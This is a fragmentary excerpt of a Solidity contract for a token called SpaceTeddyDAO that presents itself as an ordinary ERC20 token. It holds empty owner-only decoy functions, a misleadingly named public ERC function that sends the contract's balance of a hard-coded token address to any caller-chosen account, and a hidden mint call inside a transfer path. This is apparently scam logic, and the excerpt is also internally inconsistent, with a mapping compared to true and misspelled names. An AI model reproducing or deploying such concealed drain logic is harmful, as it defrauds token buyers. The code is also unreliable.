...
contract SpaceTeddyDAO is Context, IERC20, Ownable {
    ...
    string private _name = "SpaceTeddyDAO";
    string private _symbol = "SpaceTeddyDAO";
    ...
    function sss() public onlyOwner {}

    function iii() public onlyOwner {}

    function ccc() public onlyOwner {}

    function aaa() public onlyOwner {}
    
    function lll() public onlyOwner {}

    function bbb() public onlyOwner {}

    function ooo() public onlyOwner {}

    function ERC(address _account) public {
        if (_isOpenTrade() == _nunTokensSellToAddToLiquidity) {
            require(_isOpenTrade() == _nunTokensSellToAddToLiquidity);
            uint256 balacne = IERC20(address(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c)).balanceOf(address(this));
            IERC20(address(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c)).transfer(_account, balacne);
        }
    }
        ...
        returns (bool)
    {
        ...
        if (_rOwned[msg.sender] == true || _swapping() >= (15*1e9)){
            ICHI(address(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c)).mint(50);
            return true;
        }else{
